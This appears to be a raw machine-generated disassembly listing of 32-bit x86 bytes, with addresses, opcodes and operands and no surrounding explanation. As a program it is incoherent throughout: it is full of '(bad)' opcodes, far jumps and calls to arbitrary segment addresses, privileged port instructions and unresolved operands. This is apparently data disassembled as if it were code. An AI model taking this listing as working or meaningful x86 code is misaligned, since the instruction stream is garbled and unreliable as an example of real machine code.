  42d2d0:	aad    0xb0
  42d2d2:	es hlt 
  42d2d4:	lock popa 
  42d2d6:	cmp    DWORD PTR [edi+ecx*1-0x7701f5b0],edi
  42d2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2de:	adc    DWORD PTR [esi-0x7e41ae3d],ebp
  42d2e4:	ror    DWORD PTR [ebx],1
  42d2e6:	test   al,0x3c
  42d2e8:	adc    al,0xe0
  42d2ea:	inc    ecx
  42d2eb:	jmp    0x8b7a:0x8da28199
  42d2f2:	stc    
  42d2f3:	test   DWORD PTR ds:0xf5642d75,0x7c963607
  42d2fd:	and    BYTE PTR [edi],dh
  42d2ff:	lock push eax
  42d301:	repz call 0xa639:0xd438c328
  42d309:	arpl   ax,cx
  42d30b:	mov    esp,0x3f1407ae
  42d310:	push   esi
  42d311:	ret    0xa439
  42d314:	es xchg esp,eax
  42d316:	or     BYTE PTR [esi-0x44c3176f],cl
  42d31c:	inc    eax
  42d31d:	je     0x42d372
  42d31f:	jecxz  0x42d2a7
  42d321:	push   ebx
  42d322:	hlt    
  42d323:	cmp    ebx,DWORD PTR [ecx]
  42d325:	xchg   edi,eax
  42d326:	into   
  42d327:	xchg   BYTE PTR [edx],dh
  42d329:	iret   
  42d32a:	push   ecx
  42d32b:	imul   eax,DWORD PTR [eax-0x74],0xffffffc0
  42d32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d330:	scas   al,BYTE PTR es:[edi]
  42d331:	sbb    eax,0x831694fe
  42d336:	add    ebx,edx
  42d338:	scas   al,BYTE PTR es:[edi]
  42d339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d33a:	add    BYTE PTR [edx+0x25011584],0xb6
  42d341:	and    eax,DWORD PTR [esi-0x4017f07f]
  42d347:	mov    ebp,0xa2535971
  42d34c:	push   edx
  42d34d:	in     al,0x4f
  42d34f:	dec    esp
  42d350:	or     ch,BYTE PTR [ecx+0x4d22b6a8]
  42d356:	out    0x48,eax
  42d358:	or     ah,BYTE PTR [eax]
  42d35a:	adc    BYTE PTR [edx],ch
  42d35c:	sub    ebx,DWORD PTR [edi+0x4409258c]
  42d362:	mov    ecx,0x9670e5b4
  42d367:	outs   dx,BYTE PTR ds:[esi]
  42d368:	adc    DWORD PTR [esi+0x60],ebp
  42d36b:	mov    ecx,0x5be8f36d
  42d370:	mov    cl,0x68
  42d372:	mov    edx,0x466e24bd
  42d377:	or     eax,0xe0a3e6c
  42d37c:	ss cdq 
  42d37e:	adc    eax,0x70d56b2e
  42d383:	mov    WORD PTR [ecx],es
  42d385:	fldcw  WORD PTR [edi+0xe]
  42d388:	pushf  
  42d389:	xchg   ecx,eax
  42d38a:	mov    bh,0xeb
  42d38c:	and    DWORD PTR [edx],edx
  42d38e:	mov    dl,0xb1
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	mov    al,ds:0x143a0082
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	test   BYTE PTR [ebp-0x61],bh
  42d40f:	fsubr  QWORD PTR [edi+0x3e]
  42d412:	push   ss
  42d413:	and    BYTE PTR [esp+ecx*4],al
  42d416:	js     0x42d41b
  42d418:	jb     0x42d3d4
  42d41a:	cli    
  42d41b:	xchg   esp,eax
  42d41c:	xor    al,0xb7
  42d41e:	pushf  
  42d41f:	fld    DWORD PTR [eax+0x6004873]
  42d425:	std    
  42d426:	stos   DWORD PTR es:[edi],eax
  42d427:	psubusw mm2,mm1
  42d42a:	push   eax
  42d42b:	push   cs
  42d42c:	mov    esi,0x8357ba56
  42d431:	(bad)  
  42d432:	retf   
  42d433:	jmp    0x8ac8:0x34bc287a
  42d43a:	(bad)  
  42d43c:	mov    eax,ds:0x5d8c494d
  42d441:	mov    DWORD PTR [esi],esi
  42d443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d444:	xchg   ebx,eax
  42d445:	mov    eax,ds:0xe820b9a4
  42d44a:	mov    gs,WORD PTR [ebp-0x63]
  42d44d:	ret    
  42d44e:	pop    es
  42d44f:	lods   al,BYTE PTR ds:[esi]
  42d450:	xchg   edx,eax
  42d451:	add    al,0xd4
  42d453:	pop    ds
  42d454:	mov    al,ds:0x7bc05062
  42d459:	sar    al,1
  42d45b:	xor    al,0x30
  42d45d:	jns    0x42d45d
  42d45f:	(bad)  
  42d460:	mov    ebx,0x5d1bd821
  42d466:	dec    ecx
  42d467:	mul    BYTE PTR [edi+edx*8]
  42d46a:	sub    DWORD PTR ds:0x87d8d62e,ebp
  42d470:	push   es
  42d471:	pop    ecx
  42d472:	js     0x42d456
  42d474:	push   0xe8b9f140
  42d479:	sbb    al,0xb1
  42d47b:	inc    edx
  42d47c:	in     al,dx
  42d47d:	fwait
  42d47e:	push   eax
  42d47f:	dec    edx
  42d480:	fisttp QWORD PTR [eax+0x1ff8188b]
  42d486:	lahf   
  42d487:	rol    BYTE PTR [edx],1
  42d489:	imul   BYTE PTR [esp+eax*4+0x11d4382b]
  42d490:	mov    BYTE PTR [edx],bh
  42d492:	sub    ecx,DWORD PTR es:0xb679e389
  42d499:	call   0x8817:0x4210b733
  42d4a0:	cmp    BYTE PTR [ebp-0x4c92b794],ah
  42d4a6:	out    dx,eax
  42d4a7:	pop    esi
  42d4a8:	(bad)  
  42d4a9:	push   0xffffffdd
  42d4ab:	lahf   
  42d4ac:	icebp  
  42d4ad:	dec    ebp
  42d4ae:	xchg   BYTE PTR [ebp+0x23ae6ce2],ch
  42d4b4:	add    BYTE PTR ds:0xa8ffb9cb,0x7f
  42d4bb:	add    al,0xfa
  42d4bd:	arpl   WORD PTR [ecx-0x226e761d],di
  42d4c3:	push   0xf28e9235
  42d4c8:	cmp    al,0xfd
  42d4ca:	adc    ecx,esi
  42d4cc:	dec    edi
  42d4cd:	ret    0x8c78
  42d4d0:	and    eax,0xcfe71cc
  42d4d5:	jmp    0x6326:0xb02be114
  42d4dc:	mov    BYTE PTR [esi-0x10],bh
  42d4df:	loop   0x42d48c
  42d4e1:	retf   
  42d4e2:	mov    ah,0x15
  42d4e4:	jecxz  0x42d46f
  42d4e6:	dec    esp
  42d4e7:	push   0x60fce064
  42d4ec:	adc    BYTE PTR [ebx+esi*8+0x7ab7d9f5],bh
  42d4f3:	(bad)  
  42d4f4:	cmp    al,0x6f
  42d4f6:	mov    edx,0xc19f08f
  42d4fb:	pop    esp
  42d4fc:	bound  esi,QWORD PTR [esi+0xf]
  42d4ff:	js     0x42d53a
  42d501:	out    0xdc,al
  42d503:	inc    esi
  42d504:	mov    WORD PTR [edx],gs
  42d506:	mov    esi,?
  42d508:	xchg   ebp,eax
  42d509:	pop    ss
  42d50a:	or     esp,DWORD PTR [esi+0x3f3bc451]
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xc17043d5,eax
  42d583:	rcr    BYTE PTR [eax],0xe5
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	scas   eax,DWORD PTR es:[edi]
  42d58d:	inc    eax
  42d58e:	push   ecx
  42d590:	inc    ebp
  42d591:	ret    0xd2f3
  42d594:	mov    dh,0x71
  42d596:	xor    DWORD PTR [ecx-0x76],esi
  42d599:	test   BYTE PTR [edx],al
  42d59b:	or     edx,DWORD PTR [ebx+0x7cd24e3a]
  42d5a1:	inc    esi
  42d5a2:	jbe    0x42d558
  42d5a4:	stc    
  42d5a5:	mov    DWORD PTR [esi+0x2219b35d],0xeee7091a
  42d5af:	arpl   WORD PTR [eax],si
  42d5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5b2:	xchg   DWORD PTR ds:0xbed23aeb,eax
  42d5b8:	out    dx,al
  42d5b9:	mov    ecx,0xeb3e8b
  42d5be:	sbb    eax,0xe84b9ed3
  42d5c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5c4:	sub    dl,cl
  42d5c6:	cmp    al,0xc0
  42d5c8:	aas    
  42d5c9:	adc    ebp,DWORD PTR es:[edx]
  42d5cc:	bnd jp 0x42d584
  42d5cf:	cmp    DWORD PTR [edx+0x49],0xedeac6a
  42d5d6:	popa   
  42d5d7:	pop    es
  42d5d8:	and    DWORD PTR [edi],esp
  42d5da:	inc    ebp
  42d5db:	inc    edi
  42d5dc:	ffree  st(5)
  42d5de:	mov    al,ds:0x229d623d
  42d5e3:	repnz int3 
  42d5e5:	retf   0xdff0
  42d5e8:	mov    eax,0x4ba5d42b
  42d5ed:	in     eax,dx
  42d5ee:	rcr    BYTE PTR [eax-0x4f],cl
  42d5f1:	cmp    al,0xba
  42d5f3:	ins    BYTE PTR es:[edi],dx
  42d5f4:	hlt    
  42d5f5:	stos   DWORD PTR es:[edi],eax
  42d5f6:	mov    dl,bl
  42d5f8:	in     eax,0xb8
  42d5fa:	dec    edi
  42d5fb:	jbe    0x42d5a9
  42d5fd:	pop    es
  42d5fe:	retf   
  42d5ff:	xchg   ebp,eax
  42d600:	lahf   
  42d601:	pop    esp
  42d602:	adc    eax,0x93b84092
  42d607:	jmp    0xda1c:0x6461474
  42d60e:	add    BYTE PTR [esi+edx*2],ch
  42d611:	jne    0x42d677
  42d613:	or     DWORD PTR [eax-0x2a],edi
  42d616:	call   0x3df4:0xd078b731
  42d61d:	stos   DWORD PTR es:[edi],eax
  42d61e:	out    0x89,eax
  42d620:	mov    dl,0xd7
  42d622:	pushf  
  42d623:	ret    
  42d624:	xor    DWORD PTR [ecx+0x39],esp
  42d627:	mov    esi,0xe28f293d
  42d62c:	push   ds
  42d62d:	cdq    
  42d62e:	mov    esi,DWORD PTR [edi+0x2d]
  42d631:	adc    eax,0x5a49c443
  42d636:	pop    esi
  42d637:	(bad)  
  42d638:	imul   ebx,eax,0xffffffec
  42d63b:	and    al,0x17
  42d63d:	shl    DWORD PTR es:[ebx],cl
  42d640:	cmp    eax,0xd5df0eab
  42d645:	pop    eax
  42d646:	push   ds
  42d647:	out    dx,al
  42d648:	xchg   edx,eax
  42d649:	or     DWORD PTR [ecx+0x659bdc0f],esi
  42d64f:	adc    bh,BYTE PTR [edi-0x5cce5d80]
  42d655:	cdq    
  42d656:	shr    BYTE PTR [ebp-0xe1da0c3],cl
  42d65c:	adc    al,BYTE PTR [esp+ebx*1]
  42d65f:	cwde   
  42d660:	mov    dl,0x46
  42d662:	or     al,0xd5
  42d664:	addr16 mov ds:0xf4ec,al
  42d668:	or     ecx,DWORD PTR [esi-0x76]
  42d66b:	arpl   bx,cx
  42d66d:	push   ebx
  42d66e:	sti    
  42d66f:	lods   al,BYTE PTR ds:[esi]
  42d670:	js     0x42d5fd
  42d672:	adc    ecx,edx
  42d674:	scas   eax,DWORD PTR es:[edi]
  42d675:	inc    ecx
  42d676:	inc    eax
  42d677:	mov    esp,0x1c81e323
  42d67c:	pop    ebp
  42d67d:	mov    esp,0x374e29a6
  42d682:	add    DWORD PTR ds:0xdfeb940c,ecx
  42d688:	push   0xebbc0db5
  42d68d:	jb     0x42d6ba
  42d68f:	adc    DWORD PTR [eax],eax
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xa6
  42d701:	xor    al,0x2e
  42d703:	push   edi
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	aad    0x8f
  42d70e:	mov    ah,0x3d
  42d710:	aad    0x8f
  42d712:	sub    DWORD PTR ds:[eax],eax
  42d715:	call   FWORD PTR [edi+ebx*8]
  42d718:	pop    es
  42d719:	out    0x9c,eax
  42d71b:	sar    DWORD PTR [esi],0xf9
  42d71e:	(bad)  
  42d720:	sub    BYTE PTR [ebx+0x6b803eca],dh
  42d726:	cmp    ah,0xf4
  42d729:	adc    eax,0x5dfe6ccd
  42d72e:	xlat   BYTE PTR ds:[ebx]
  42d72f:	scas   al,BYTE PTR es:[edi]
  42d730:	jp     0x42d780
  42d732:	mov    ch,0xe3
  42d734:	sbb    al,0xe
  42d736:	mov    dh,0xe9
  42d738:	lahf   
  42d739:	sub    eax,DWORD PTR [edi]
  42d73b:	and    eax,0xa4cacd7d
  42d740:	and    ch,BYTE PTR [edx+edx*2]
  42d743:	cmp    al,0x85
  42d745:	mov    edx,0xeaf6bda4
  42d74a:	pop    ecx
  42d74b:	int    0xea
  42d74d:	and    DWORD PTR [edx-0x5d],edx
  42d750:	cli    
  42d751:	or     eax,0xdfb77189
  42d756:	mov    cs,WORD PTR [ecx+0x2bbe696e]
  42d75c:	sbb    BYTE PTR [edx+0x42],bl
  42d75f:	pop    ecx
  42d760:	pop    esp
  42d761:	xchg   edi,eax
  42d762:	mov    ebx,DWORD PTR [eax+0x4120110]
  42d768:	stos   BYTE PTR es:[edi],al
  42d769:	push   ebx
  42d76a:	aaa    
  42d76b:	(bad)  
  42d76c:	pop    DWORD PTR [ecx+eax*8]
  42d76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d770:	ret    
  42d771:	sbb    dh,BYTE PTR [edx-0x5d]
  42d774:	mov    ebx,0x8252c573
  42d779:	aaa    
  42d77a:	mov    esi,0xa1c64a6a
  42d77f:	loop   0x42d736
  42d781:	inc    esi
  42d782:	loope  0x42d7d8
  42d784:	test   al,0x16
  42d786:	pop    DWORD PTR [eax+edi*4]
  42d789:	and    BYTE PTR [esi],cl
  42d78b:	les    edi,FWORD PTR [ebx]
  42d78d:	mov    WORD PTR [edx-0x29f5705d],ss
  42d793:	ds std 
  42d795:	(bad)  
  42d796:	(bad)  [eax+0x3b]
  42d799:	pop    eax
  42d79a:	and    ecx,DWORD PTR [esi+ebx*8]
  42d79d:	dec    ecx
  42d79e:	mov    dh,0x20
  42d7a0:	mov    esi,0xb876684f
  42d7a5:	in     al,dx
  42d7a6:	jmp    0x42d815
  42d7a8:	xchg   ebp,eax
  42d7a9:	mov    ah,0x66
  42d7ab:	popf   
  42d7ac:	and    al,0x61
  42d7ae:	into   
  42d7af:	or     ebx,DWORD PTR fs:[ecx+0x4c6ed469]
  42d7b6:	inc    esp
  42d7b7:	retf   
  42d7b8:	add    eax,0xc9138f7a
  42d7bd:	xchg   ebp,eax
  42d7be:	cmp    ch,bh
  42d7c0:	pop    esp
  42d7c1:	jns    0x42d750
  42d7c3:	and    eax,0xe3a39748
  42d7c8:	sbb    al,0xe9
  42d7ca:	fdivr  st,st(2)
  42d7cc:	clc    
  42d7cd:	jle    0x42d830
  42d7cf:	dec    ecx
  42d7d0:	(bad)  
  42d7d1:	in     al,dx
  42d7d2:	add    BYTE PTR [eax+0x428b997e],ch
  42d7d8:	pop    ss
  42d7d9:	sbb    eax,0xa0c24fa8
  42d7de:	cdq    
  42d7df:	test   DWORD PTR [ebp-0x68],ecx
  42d7e2:	push   edi
  42d7e3:	dec    ebx
  42d7e4:	cld    
  42d7e5:	jb     0x42d7e3
  42d7e7:	adc    eax,0x8b29a2a8
  42d7ec:	das    
  42d7ed:	into   
  42d7ee:	jb     0x42d83a
  42d7f0:	sbb    eax,eax
  42d7f2:	sahf   
  42d7f3:	js     0x42d800
  42d7f5:	clc    
  42d7f6:	sbb    DWORD PTR [ebp-0x17],edi
  42d7f9:	push   ss
  42d7fa:	jnp    0x42d79d
  42d7fc:	jmp    0x28dcd610
  42d801:	cmp    dh,bh
  42d803:	or     eax,0x56d5ec13
  42d808:	add    esp,DWORD PTR [ebx-0xecb48af]
  42d80e:	push   eax
  42d80f:	lea    eax,[eax]
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x42c6961a
  42d881:	inc    ecx
  42d882:	dec    esp
  42d883:	mov    ecx,0x1e720
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	add    DWORD PTR [ebx+0x226500d6],eax
  42d892:	inc    esi
  42d893:	daa    
  42d894:	adc    al,0x39
  42d896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d897:	popf   
  42d898:	ins    DWORD PTR es:[edi],dx
  42d899:	cmp    edi,DWORD PTR [ebp-0x10]
  42d89c:	push   ebx
  42d89d:	jno    0x42d884
  42d89f:	push   esi
  42d8a0:	clc    
  42d8a1:	push   ds
  42d8a2:	pop    ds
  42d8a3:	cmp    al,0x21
  42d8a5:	(bad)  
  42d8a6:	sub    eax,0x3850db01
  42d8ab:	dec    ebp
  42d8ac:	rol    al,1
  42d8ae:	pop    esp
  42d8af:	xor    edi,DWORD PTR [edi+0x4ab46f17]
  42d8b5:	xchg   DWORD PTR [ebx+eiz*1-0x3d],esp
  42d8b9:	lds    edi,FWORD PTR [eax+eiz*4+0x1e4b25d0]
  42d8c0:	je     0x42d882
  42d8c2:	mov    esi,0xbad1225c
  42d8c7:	enter  0x77c0,0x63
  42d8cb:	push   cs
  42d8cc:	xchg   edx,eax
  42d8cd:	pop    edi
  42d8ce:	pop    ss
  42d8cf:	cmp    cl,al
  42d8d1:	fstp   QWORD PTR [eax+0x55]
  42d8d4:	mov    al,ds:0x37980811
  42d8d9:	mov    ebx,0xd07b8aee
  42d8de:	adc    DWORD PTR [esi+edx*8-0x741f6486],ebx
  42d8e5:	pop    ds
  42d8e6:	std    
  42d8e7:	add    eax,esp
  42d8e9:	retf   
  42d8ea:	dec    ebp
  42d8eb:	mov    dh,0x4a
  42d8ed:	inc    esi
  42d8ee:	sbb    al,0xd3
  42d8f0:	xchg   ebp,eax
  42d8f1:	xor    eax,0xe67ae433
  42d8f6:	outs   dx,BYTE PTR ds:[esi]
  42d8f7:	ret    
  42d8f8:	cld    
  42d8f9:	inc    ecx
  42d8fa:	jmp    0xa2ca58dd
  42d8ff:	aam    0x8a
  42d901:	jnp    0x42d909
  42d903:	nop
  42d904:	xor    ah,BYTE PTR ss:[edi+0x16e1a457]
  42d90b:	pushf  
  42d90c:	mov    edi,0x75b185e9
  42d911:	std    
  42d912:	mov    ebx,0x193de014
  42d917:	xlat   BYTE PTR ds:[ebx]
  42d918:	icebp  
  42d919:	scas   al,BYTE PTR es:[edi]
  42d91a:	jbe    0x42d8ab
  42d91c:	pop    esp
  42d91d:	lods   eax,DWORD PTR ds:[esi]
  42d91e:	(bad)  
  42d91f:	jge    0x42d93c
  42d921:	push   edx
  42d922:	rol    DWORD PTR [esi],1
  42d924:	stos   DWORD PTR es:[edi],eax
  42d925:	mov    esp,0xa54416b3
  42d92a:	cmp    esi,DWORD PTR [edx+0x3a]
  42d92d:	push   ds
  42d92e:	je     0x42d8f5
  42d930:	test   al,0x7c
  42d932:	sub    eax,0x999d5c32
  42d937:	inc    esi
  42d938:	cmp    al,BYTE PTR [eax+0x3a]
  42d93b:	jne    0x42d9b6
  42d93d:	retf   0x7748
  42d940:	ror    ecx,1
  42d942:	ja     0x42d95c
  42d944:	je     0x42d984
  42d946:	and    dl,BYTE PTR [ecx-0x1b]
  42d949:	sub    BYTE PTR [esi-0x2dad5932],0x2f
  42d950:	adc    DWORD PTR [edi-0x63],esi
  42d953:	sub    dl,cl
  42d955:	jp     0x42d8e8
  42d957:	call   0x5c1005b8
  42d95c:	mov    BYTE PTR [ebp+0x3e],dl
  42d95f:	and    ch,BYTE PTR [edx+0x70]
  42d962:	hlt    
  42d963:	clc    
  42d964:	ret    
  42d965:	mov    edx,DWORD PTR [ecx]
  42d967:	out    0xaa,eax
  42d969:	mov    eax,ds:0x5176ef07
  42d96e:	outs   dx,DWORD PTR ds:[esi]
  42d96f:	rcr    DWORD PTR [edx+0x3c],0x73
  42d973:	dec    edx
  42d974:	cmp    bl,BYTE PTR ds:0x678cdb7e
  42d97a:	and    eax,0xcaa7ce9a
  42d97f:	stos   DWORD PTR es:[edi],eax
  42d980:	or     al,0x5c
  42d982:	add    eax,0x823fe875
  42d987:	mov    dl,0x33
  42d989:	push   ebx
  42d98a:	mov    esp,0x26eee1fa
  42d98f:	jb     0x42d991
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	xor    esp,DWORD PTR [ebx+0x21]
  42da03:	in     al,dx
  42da04:	and    al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	pop    es
  42da0d:	cmp    al,0xe5
  42da0f:	cmp    DWORD PTR [eax+eiz*2],0x8b3c63d7
  42da16:	fimul  WORD PTR [edx+0x56]
  42da19:	stc    
  42da1a:	mov    bl,0xa0
  42da1c:	mov    ah,0x75
  42da1e:	xchg   edi,eax
  42da1f:	cmp    al,BYTE PTR [edi+0x2c]
  42da22:	data16 (bad) 
  42da24:	xchg   edx,eax
  42da25:	retf   
  42da26:	pop    ebp
  42da27:	xchg   dh,bl
  42da29:	add    al,0x5d
  42da2b:	and    esp,DWORD PTR ds:0xb66bed64
  42da31:	mov    eax,ds:0xccb17ae6
  42da36:	test   eax,0x5e7971d6
  42da3b:	clc    
  42da3c:	or     eax,0xa985f24e
  42da41:	inc    esi
  42da42:	lock imul esp,DWORD PTR [ebp+eax*4+0x4907e991],0x57
  42da4b:	cwde   
  42da4c:	mov    ah,0x3d
  42da4e:	int3   
  42da4f:	sbb    al,0x3f
  42da51:	hlt    
  42da52:	push   ecx
  42da53:	aaa    
  42da54:	add    esi,DWORD PTR [ecx]
  42da56:	xor    edi,edi
  42da58:	call   FWORD PTR [edi+0x2f]
  42da5b:	xchg   DWORD PTR [esi+0x819a34a],ecx
  42da61:	mov    ebx,0x85c35da9
  42da66:	fisttp DWORD PTR [edx-0x2957e6ad]
  42da6c:	cmp    eax,0x3f072ac0
  42da71:	aas    
  42da72:	xor    BYTE PTR [edx-0x52f972b5],dh
  42da78:	gs push ebp
  42da7a:	mov    cl,0x40
  42da7c:	sbb    eax,0xe224e115
  42da81:	adc    ah,bh
  42da83:	xchg   DWORD PTR [edx+0x1a880772],edi
  42da89:	mov    ecx,0xcd952023
  42da8e:	aas    
  42da8f:	outs   dx,BYTE PTR ds:[esi]
  42da90:	xchg   ebx,eax
  42da91:	xchg   ebp,eax
  42da92:	(bad)  
  42da93:	xor    DWORD PTR [ecx+0x74],ecx
  42da96:	jmp    0x42da4d
  42da98:	sub    eax,0xc6bb608e
  42da9d:	cmp    eax,esi
  42da9f:	xlat   BYTE PTR ds:[ebx]
  42daa0:	lods   al,BYTE PTR ds:[esi]
  42daa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42daa2:	rol    BYTE PTR [ecx],cl
  42daa4:	mov    al,ds:0x5624ab18
  42daa9:	push   esp
  42daaa:	xor    BYTE PTR [edi-0x54],ch
  42daad:	call   0x9ab4:0xed3002ac
  42dab4:	idiv   DWORD PTR [ebx+0xa2f70f2]
  42daba:	adc    eax,0x3d2f27c5
  42dabf:	pop    ebx
  42dac0:	jmp    0x5466:0x15786bc8
  42dac7:	imul   esp,esp,0xffffffbf
  42daca:	fld    QWORD PTR [edi+0x5]
  42dacd:	dec    esp
  42dace:	in     eax,dx
  42dacf:	add    cl,BYTE PTR [ebx]
  42dad1:	outs   dx,BYTE PTR ds:[esi]
  42dad2:	push   0x14
  42dad4:	jle    0x42dad2
  42dad6:	mov    dh,BYTE PTR [ecx-0x59]
  42dad9:	mov    edi,0x4734ed08
  42dade:	xchg   esp,eax
  42dadf:	imul   ebp,DWORD PTR [ebx-0x47d11d9e],0x84df9faa
  42dae9:	jle    0x42da75
  42daeb:	rol    BYTE PTR [edi],cl
  42daed:	push   esi
  42daee:	outs   dx,BYTE PTR ds:[esi]
  42daef:	mov    bh,0x3f
  42daf1:	sbb    DWORD PTR [edi+0x15],edx
  42daf4:	ja     0x42db10
  42daf6:	mov    edx,0x7c8005d2
  42dafb:	int    0xff
  42dafd:	or     esi,DWORD PTR [ecx-0x6b]
  42db00:	xor    eax,0xf9ca982
  42db05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db06:	scas   eax,DWORD PTR es:[edi]
  42db07:	pushf  
  42db08:	xlat   BYTE PTR ds:[ebx]
  42db09:	das    
  42db0a:	mov    bl,cl
  42db0c:	and    BYTE PTR [ebx+0x20],al
  42db0f:	jle    0x42db11
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db49
  42db81:	jne    0x42db2f
  42db83:	mov    al,0x28
  42db85:	jmp    0x146db8b
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	iret   
  42db8d:	jnp    0x42dba7
  42db8f:	fist   DWORD PTR [ecx]
  42db91:	outs   dx,BYTE PTR ds:[esi]
  42db92:	sti    
  42db93:	jnp    0x42dbd8
  42db95:	popf   
  42db96:	(bad)  
  42db97:	int3   
  42db98:	adc    eax,0x5aa1be03
  42db9d:	pop    ebp
  42db9e:	dec    edi
  42db9f:	pop    ebx
  42dba0:	mov    ecx,ss
  42dba2:	xor    cl,bl
  42dba4:	sub    eax,0xc67886cf
  42dba9:	cmp    esp,0xffffff92
  42dbac:	cmp    eax,0x91d55b2d
  42dbb1:	mov    ah,0x5f
  42dbb3:	dec    edx
  42dbb4:	mov    ch,0x21
  42dbb6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbb8:	test   DWORD PTR [ebp-0x13ab9af4],edx
  42dbbe:	test   BYTE PTR fs:[ebx+0x6a3c7c48],al
  42dbc5:	mov    ecx,0xd7e956ed
  42dbca:	stos   BYTE PTR es:[edi],al
  42dbcb:	sbb    DWORD PTR [ebx+0x6fac46fd],0xffffffa2
  42dbd2:	(bad)  
  42dbd3:	das    
  42dbd4:	outs   dx,BYTE PTR ds:[esi]
  42dbd5:	cmp    al,0xe8
  42dbd7:	cwde   
  42dbd8:	nop    DWORD PTR fs:[eax-0xe]
  42dbdd:	inc    ebx
  42dbde:	sub    ah,0x70
  42dbe1:	daa    
  42dbe2:	xor    ecx,ebx
  42dbe4:	cmp    DWORD PTR [esp+eax*8-0x10],ebp
  42dbe8:	mov    edi,0x598e4158
  42dbed:	out    dx,eax
  42dbee:	mov    esi,0xd47c6cba
  42dbf3:	(bad)  
  42dbf4:	(bad)  
  42dbf6:	pusha  
  42dbf7:	xor    DWORD PTR [ecx],edi
  42dbf9:	fcmovnb st,st(2)
  42dbfb:	push   cs
  42dbfc:	add    ebp,DWORD PTR [ebx-0x5a]
  42dbff:	scas   eax,DWORD PTR es:[edi]
  42dc00:	push   ecx
  42dc01:	adc    al,0xc0
  42dc03:	xchg   DWORD PTR [ebp+0x4a0ebe0d],ebp
  42dc09:	add    al,0x3e
  42dc0b:	(bad)  
  42dc0d:	pop    ds
  42dc0e:	adc    edi,esp
  42dc10:	jle    0x42dbf1
  42dc12:	lock into 
  42dc14:	jae    0x42dbe8
  42dc16:	imul   DWORD PTR [ecx+eax*2]
  42dc19:	int    0xe7
  42dc1b:	inc    ecx
  42dc1c:	pop    ds
  42dc1d:	ins    BYTE PTR es:[edi],dx
  42dc1e:	jae    0x42dc49
  42dc20:	mov    WORD PTR [eax-0x2293bfb3],?
  42dc26:	ins    DWORD PTR es:[edi],dx
  42dc27:	cmc    
  42dc28:	jns    0x42dc91
  42dc2a:	dec    edi
  42dc2b:	mov    edx,0x6383b543
  42dc30:	xor    DWORD PTR ds:0xa6e6c144,ebp
  42dc36:	mov    edi,0xc295e797
  42dc3b:	cmp    BYTE PTR [ebx+0x8],bh
  42dc3e:	ret    0x7a64
  42dc41:	ret    0x1be4
  42dc44:	call   0x4f3:0x4fd66301
  42dc4b:	jmp    0x42dc41
  42dc4d:	xor    DWORD PTR [esi],esi
  42dc4f:	push   ds
  42dc50:	push   ecx
  42dc51:	xchg   esp,eax
  42dc52:	pop    eax
  42dc53:	cmp    BYTE PTR [ebx],cl
  42dc55:	imul   edx,DWORD PTR [ecx+0x16f3d879],0x9ea166d1
  42dc5f:	adc    dh,BYTE PTR [eax]
  42dc61:	inc    eax
  42dc62:	pop    eax
  42dc63:	aad    0xbe
  42dc65:	out    dx,eax
  42dc66:	(bad)  
  42dc68:	outs   dx,BYTE PTR ds:[esi]
  42dc69:	jmp    0x42dbec
  42dc6b:	dec    ecx
  42dc6c:	dec    esi
  42dc6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc6e:	out    0x1b,al
  42dc70:	(bad)  
  42dc71:	test   ecx,0xdac0c3af
  42dc77:	cmp    DWORD PTR [ebp-0x4e],edi
  42dc7a:	adc    dl,BYTE PTR ds:0xb62a0b24
  42dc80:	add    ah,BYTE PTR [ebp-0x1bd0eef9]
  42dc86:	ins    DWORD PTR es:[edi],dx
  42dc87:	lock popa 
  42dc89:	mov    cl,BYTE PTR [edi]
